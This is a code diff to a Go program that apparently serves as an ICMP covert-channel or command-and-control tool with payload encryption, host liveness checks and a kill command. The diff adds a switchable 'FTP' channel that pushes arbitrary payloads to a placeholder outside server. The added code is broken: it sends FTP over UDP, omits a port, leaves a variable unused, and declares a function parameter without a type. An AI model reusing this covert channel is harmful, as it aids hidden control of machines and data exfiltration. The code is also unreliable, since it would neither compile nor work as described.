@@ -23,6 +23,7 @@ var ALIVE = make(map[string]bool)
 var PacketQueue []icmp.Message
 var SSM bool = false
 var execute = false
+var protocol = "icmp"
 var ID int = 0
 var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
 var EncryptValue = 3
@@ -223,8 +224,42 @@ func GenerateHeader(segment int, segmented bool, ip string) string {
 	return header
 }
 
+// Create a custom FTP packet with the specified payload
+func MakeFTPPacket(payload string) {
+    // Replace these values with your server's IP and port
+    serverIP := "ftp.server.ip.address"
+    serverPort := 21
+
+    // Create an FTP payload with the specified data
+    ftpPayload := "USER anonymous\r\nPASS yourpassword\r\n" + payload + "\r\n"
+
+    // Resolve the FTP server address
+    serverAddr, err := net.ResolveUDPAddr("udp4", serverIP)
+    if err != nil {
+        log.Fatal(err)
+        return
+    }
+
+    // Create a connection to the FTP server
+    conn, err := net.DialUDP("udp4", nil, serverAddr)
+    if err != nil {
+        log.Fatal(err)
+        return
+    }
+    defer conn.Close()
+
+    // Set a timeout for the connection
+    conn.SetDeadline(time.Now().Add(5 * time.Second))
+
+    // Send the FTP payload to the server
+    _, err = conn.Write([]byte(ftpPayload))
+    if err != nil {
+        log.Fatal(err)
+    }
+}
+
 // Make the custom ICMP packet using the specified payload
-func MakePacket(payload string) {
+func MakeICMPPacket(payload string) {
 	// If SuperSecretMode is enabled, encrypt the payload
 	if SSM {
 		payload = payload[0:8] + encrypt(payload[8:])
@@ -243,6 +278,16 @@ func MakePacket(payload string) {
 
 	// Add the packet to the packet queue for sending
 	PacketQueue = append(PacketQueue, packet)
+}
+
+func MakePacket(message string) {
+	if protocol == "ftp" {
+		MakeFTPPacket(message)
+	} else if protocol == "icmp" {
+		MakeICMPPacket(message)
+	} else {
+		fmt.Println("[ERROR] Unsupported protocol:", protocol)
+	}
 }
 
 // Using the packet listener and an IP address, send everything in the packet queue
@@ -332,6 +377,10 @@ func convert(values []byte) string {
 	var converted string
 	converted = bytes.NewBuffer(values).String()
 	return converted
+}
+
+func Switch_Protocol(switched) {
+	protocol = switched
 }
 
 // Start the packet sniffer
@@ -489,6 +538,8 @@ func main() {
 			SendToAll("ping")
 			time.Sleep(5000 * time.Millisecond)
 			CheckAlive()
+		case "protocol":
+			Switch_Protocol(tokens[1])
 		case "help":
 			print_help()
 		case "kill":
